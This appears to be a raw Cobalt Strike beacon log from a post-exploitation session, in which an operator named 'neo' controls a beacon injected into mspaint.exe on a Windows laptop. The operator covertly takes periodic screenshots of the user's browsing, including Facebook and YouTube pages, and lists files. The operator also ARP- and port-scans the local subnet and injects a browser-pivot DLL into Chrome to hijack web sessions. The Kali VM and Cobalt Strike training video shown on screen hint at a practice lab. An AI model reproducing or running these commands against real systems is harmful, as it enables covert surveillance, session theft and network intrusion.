01/06 08:03:08 UTC [metadata] 192.168.88.108 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 8916; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
01/06 08:03:35 UTC [input] <neo> sleep 5
01/06 08:03:35 UTC [task] <T1029> Tasked beacon to sleep for 5s
01/06 08:04:02 UTC [checkin] host called home, sent: 35 bytes
01/06 08:04:07 UTC [checkin] host called home, sent: 67 bytes
01/06 08:04:27 UTC [checkin] host called home, sent: 12 bytes
01/06 08:04:37 UTC [input] <neo> sleep 10
01/06 08:04:37 UTC [task] <T1029> Tasked beacon to sleep for 10s
01/06 08:04:42 UTC [checkin] host called home, sent: 16 bytes
01/06 08:04:50 UTC [input] <neo> screenwatch 0 null
01/06 08:04:50 UTC [task] <T1113, T1055> Tasked beacon to take periodic screenshots
01/06 08:04:52 UTC [checkin] host called home, sent: 163948 bytes
01/06 08:05:02 UTC [error] could not open process 0: 87
01/06 08:05:02 UTC [error] Could not connect to pipe: 2
01/06 08:05:10 UTC [input] <neo> screenwatch 14532 x64
01/06 08:05:10 UTC [task] <T1113, T1055> Tasked beacon to take periodic screenshots into 14532 (x64)
01/06 08:05:12 UTC [checkin] host called home, sent: 199788 bytes
01/06 08:05:18 UTC [input] <neo> screenshot 14532 x64
01/06 08:05:18 UTC [task] <T1113, T1055> Tasked beacon to take screenshot into 14532 (x64)
01/06 08:05:23 UTC [error] Could not connect to pipe: 2
01/06 08:05:33 UTC [checkin] host called home, sent: 199787 bytes
01/06 08:05:43 UTC [error] Could not connect to pipe: 2
01/06 08:05:46 UTC [input] <neo> ls
01/06 08:05:46 UTC [task] <> Tasked beacon to list files in .
01/06 08:05:53 UTC [checkin] host called home, sent: 19 bytes
01/06 08:05:53 UTC [output]
C:\Users\NITRO5~1\AppData\Local\Temp\RarSFX13\*
D	0	01/06/2023 15:01:51	.
D	0	01/06/2023 15:04:01	..
F	1216512	01/06/2023 09:07:37	a.exe
F	11898	01/06/2023 08:35:50	Test.docx


01/06 08:06:19 UTC [input] <neo> screenshot 13036 x64
01/06 08:06:19 UTC [task] <T1113, T1055> Tasked beacon to take screenshot into 13036 (x64)
01/06 08:06:23 UTC [checkin] host called home, sent: 199787 bytes
01/06 08:06:24 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (196kb)

01/06 08:09:43 UTC [input] <neo> desktop
01/06 08:09:44 UTC [checkin] host called home, sent: 16 bytes
01/06 08:10:29 UTC [input] <neo> net view
01/06 08:10:45 UTC [checkin] host called home, sent: 1522 bytes
01/06 08:10:54 UTC [input] <neo> portscan 192.168.88.0-192.168.88.255 1-1024,3389,5000-6000 arp 1024
01/06 08:10:54 UTC [task] <T1046, T1093> Tasked beacon to scan ports 1-1024,3389,5000-6000 on 192.168.88.0-192.168.88.255
01/06 08:10:54 UTC [checkin] host called home, sent: 93285 bytes
01/06 08:10:56 UTC [output]
received output:
(ARP) Target '192.168.88.1' is alive. CC-71-90-46-CE-67


01/06 08:11:06 UTC [output]
received output:
(ARP) Target '192.168.88.108' is alive. 08-6A-C5-52-84-5B


01/06 08:11:07 UTC [output]
received output:
(ARP) Target '192.168.88.103' is alive. (ARP) Target '192.168.88.116' is alive. FC64--775D--7486--915A--3A9F--7F9C



01/06 08:11:10 UTC [output]
received output:
(ARP) Target '192.168.88.146' is alive. 00-0C-29-F2-CA-B1
(ARP) Target '192.168.88.153' is alive. (ARP) Target '192.168.88.152' is alive. CCCC--7171--9090--4746--2C64--7B67

(ARP) Target '192.168.88.155' is alive. (ARP) Target '192.168.88.141' is alive. 227C--85B2--157D--03D3--72D0--F5EC



01/06 08:11:11 UTC [output]
received output:
(ARP) Target '192.168.88.149' is alive. D2-3E-4F-24-03-B2


01/06 08:11:13 UTC [output]
received output:
(ARP) Target '192.168.88.184' is alive. 80-2B-F9-30-6D-ED
(ARP) Target '192.168.88.179' is alive. (ARP) Target '192.168.88.185' is alive. (ARP) Target '192.168.88.186' is alive. (ARP) Target '192.168.88.187' is alive. (ARP) Target '192.168.88.180' is alive. 3A(ARP) Target '192.168.88.177' is alive. (ARP) Target '192.168.88.189' is alive. (ARP) Target '192.168.88.182' is alive. BEB48098-623C00----9B---EC172B54-DF06D2----CC---91A8F91B-653079----A0---29403023-544C11----CB---68B25805-C0D229----72---CB5C6191
E3E2A4






(ARP) Target '192.168.88.195' is alive. 30-35-AD-40-5E-1F


01/06 08:11:14 UTC [output]
received output:
(ARP) Target '192.168.88.174' is alive. 0E-5C-4B-9E-50-F5


01/06 08:12:34 UTC [checkin] host called home, sent: 12 bytes
01/06 08:12:37 UTC [input] <neo> browserpivot 13036 x64
01/06 08:12:37 UTC [task] <T1111, T1055, T1185> Injecting browser pivot DLL into 13036 (x64)
01/06 08:12:37 UTC [output]
Browser Pivot HTTP proxy is at: 192.168.88.146:35419

01/06 08:12:37 UTC [output]
started port forward on 37157 to 127.0.0.1:37157

01/06 08:12:37 UTC [checkin] host called home, sent: 88096 bytes
01/06 08:12:45 UTC [output]
received output:
192.168.88.195:53


01/06 08:13:04 UTC [output]
received output:
192.168.88.189:5000


01/06 08:13:47 UTC [output]
received output:
192.168.88.187:3389


01/06 08:14:10 UTC [output]
received output:
192.168.88.187:139
192.168.88.187:135


01/06 08:14:11 UTC [output]
received output:
192.168.88.187:80


01/06 08:14:33 UTC [checkin] host called home, sent: 19 bytes
01/06 08:14:47 UTC [checkin] host called home, sent: 12 bytes
01/06 08:15:57 UTC [input] <neo> screenwatch 0 null
01/06 08:15:57 UTC [task] <T1113, T1055> Tasked beacon to take periodic screenshots
01/06 08:15:57 UTC [checkin] host called home, sent: 163948 bytes
01/06 08:16:07 UTC [error] could not open process 0: 87
01/06 08:16:07 UTC [error] Could not connect to pipe: 2
01/06 08:16:50 UTC [output]
received output:
192.168.88.180:80


01/06 08:18:15 UTC [output]
received output:
192.168.88.184:5357


01/06 08:18:28 UTC [output]
received output:
192.168.88.184:5040


01/06 08:18:54 UTC [output]
received output:
192.168.88.184:139
192.168.88.184:135


01/06 08:20:23 UTC [output]
received output:
192.168.88.141:5432


01/06 08:20:24 UTC [output]
received output:
192.168.88.141:5357


01/06 08:20:34 UTC [output]
received output:
192.168.88.141:5040


01/06 08:21:03 UTC [output]
received output:
192.168.88.141:139
192.168.88.141:135


01/06 08:22:01 UTC [output]
received output:
192.168.88.153:80


01/06 08:22:08 UTC [output]
received output:
192.168.88.153:53


01/06 08:22:37 UTC [input] <neo> screenwatch 10
01/06 08:22:37 UTC [task] <T1113, T1093> Tasked beacon to take periodic screenshots
01/06 08:22:37 UTC [checkin] host called home, sent: 199780 bytes
01/06 08:22:38 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (200kb)

01/06 08:22:48 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (205kb)

01/06 08:22:53 UTC [output]
received screenshot of Red Team Ops with Cobalt Strike - Post Exploitation (6 of 9) - YouTube - Google Chrome from NITRO 5 (254kb)

01/06 08:22:59 UTC [output]
received screenshot of Collision Detection for Visually Impaired from a Body-Mounted Camera - Google Chrome from NITRO 5 (318kb)

01/06 08:23:02 UTC [output]
received output:
192.168.88.152:80


01/06 08:23:04 UTC [output]
received screenshot of Collision Detection for Visually Impaired from a Body-Mounted Camera - Google Chrome from NITRO 5 (318kb)

01/06 08:23:08 UTC [output]
received screenshot of Obstacle detection and warning system for visually impaired people based on electrode matrix and mobile Kinect | SpringerLink - Google Chrome from NITRO 5 (234kb)

01/06 08:23:09 UTC [output]
received output:
192.168.88.146:90
192.168.88.146:85
192.168.88.146:82
192.168.88.146:80


01/06 08:23:13 UTC [output]
received screenshot of Facebook - Google Chrome from NITRO 5 (203kb)

01/06 08:23:19 UTC [output]
received screenshot of Facebook - Google Chrome from NITRO 5 (224kb)

01/06 08:23:24 UTC [output]
received screenshot of Facebook - Google Chrome from NITRO 5 (184kb)

01/06 08:23:29 UTC [output]
received screenshot of Facebook - Google Chrome from NITRO 5 (222kb)

01/06 08:23:34 UTC [output]
received screenshot of Facebook - Google Chrome from NITRO 5 (211kb)

01/06 08:23:39 UTC [output]
received screenshot of Facebook - Google Chrome from NITRO 5 (204kb)

01/06 08:23:44 UTC [output]
received screenshot of Facebook - Google Chrome from NITRO 5 (192kb)

01/06 08:23:49 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (236kb)

01/06 08:23:54 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (238kb)

01/06 08:23:59 UTC [output]
received screenshot of Facebook - Google Chrome from NITRO 5 (189kb)

01/06 08:24:05 UTC [output]
received screenshot of YouTube - Google Chrome from NITRO 5 (192kb)

01/06 08:24:11 UTC [output]
received screenshot of YouTube - Google Chrome from NITRO 5 (338kb)

01/06 08:24:15 UTC [output]
received screenshot of T?o dáng cây d?c l? dón T?t | VTV24 - YouTube - Google Chrome from NITRO 5 (280kb)

01/06 08:24:18 UTC [output]
received output:
192.168.88.103:5357


01/06 08:24:32 UTC [output]
received output:
192.168.88.103:5040


01/06 08:24:50 UTC [output]
received screenshot of T?o dáng cây d?c l? dón T?t | VTV24 - YouTube - Google Chrome from NITRO 5 (247kb)

01/06 08:24:55 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (253kb)

01/06 08:25:00 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (257kb)

01/06 08:25:02 UTC [input] <neo> screenwatch 0
01/06 08:25:02 UTC [task] <T1113, T1093> Tasked beacon to take periodic screenshots
01/06 08:25:02 UTC [checkin] host called home, sent: 199780 bytes
01/06 08:25:03 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (247kb)

01/06 08:25:05 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (255kb)

01/06 08:25:06 UTC [output]
received output:
192.168.88.108:5040
192.168.88.108:912
192.168.88.108:902


01/06 08:25:08 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (243kb)

01/06 08:25:10 UTC [output]
received output:
192.168.88.108:139
192.168.88.108:135
192.168.88.108:22 (SSH-2.0-OpenSSH_for_Windows_8.6)


01/06 08:25:10 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (240kb)

01/06 08:25:14 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (256kb)

01/06 08:25:15 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (238kb)

01/06 08:25:18 UTC [input] <neo> screenwatch 0 null
01/06 08:25:18 UTC [task] <T1113, T1093> Tasked beacon to take periodic screenshots
01/06 08:25:19 UTC [checkin] host called home, sent: 199780 bytes
01/06 08:25:21 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (244kb)

01/06 08:25:21 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (234kb)

01/06 08:25:21 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (234kb)

01/06 08:25:25 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (239kb)

01/06 08:25:25 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (239kb)

01/06 08:25:26 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (247kb)

01/06 08:25:30 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (247kb)

01/06 08:25:30 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (247kb)

01/06 08:25:31 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (261kb)

01/06 08:25:35 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (246kb)

01/06 08:25:35 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (246kb)

01/06 08:25:36 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (237kb)

01/06 08:25:40 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (266kb)

01/06 08:25:40 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (266kb)

01/06 08:25:41 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (274kb)

01/06 08:25:43 UTC [input] <neo> screenwatch 100000
01/06 08:25:43 UTC [task] <T1113, T1093> Tasked beacon to take periodic screenshots
01/06 08:25:43 UTC [checkin] host called home, sent: 199780 bytes
01/06 08:25:44 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (270kb)

01/06 08:25:45 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (275kb)

01/06 08:25:45 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (277kb)

01/06 08:25:47 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (284kb)

01/06 08:25:49 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (290kb)

01/06 08:25:55 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (293kb)

01/06 08:25:55 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (294kb)

01/06 08:25:55 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (301kb)

01/06 08:25:55 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (301kb)

01/06 08:25:56 UTC [output]
received output:
192.168.88.1:80


01/06 08:25:57 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (298kb)

01/06 08:25:57 UTC [output]
received output:
192.168.88.1:53


01/06 08:26:00 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (292kb)

01/06 08:26:00 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (294kb)

01/06 08:26:01 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (294kb)

01/06 08:26:01 UTC [output]
received output:
192.168.88.1:22 (SSH-2.0-dropbear_2015.67)


01/06 08:26:02 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (282kb)

01/06 08:26:05 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (286kb)

01/06 08:26:05 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (283kb)

01/06 08:26:06 UTC [output]
received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from NITRO 5 (283kb)

01/06 08:26:06 UTC [input] <neo> exit
01/06 08:26:06 UTC [task] <> Tasked beacon to exit
01/06 08:26:06 UTC [checkin] host called home, sent: 8 bytes
01/06 08:26:06 UTC [output]
beacon exit.

01/06 08:32:20 UTC [input] <neo> exit
01/06 08:32:20 UTC [task] <> Tasked beacon to exit
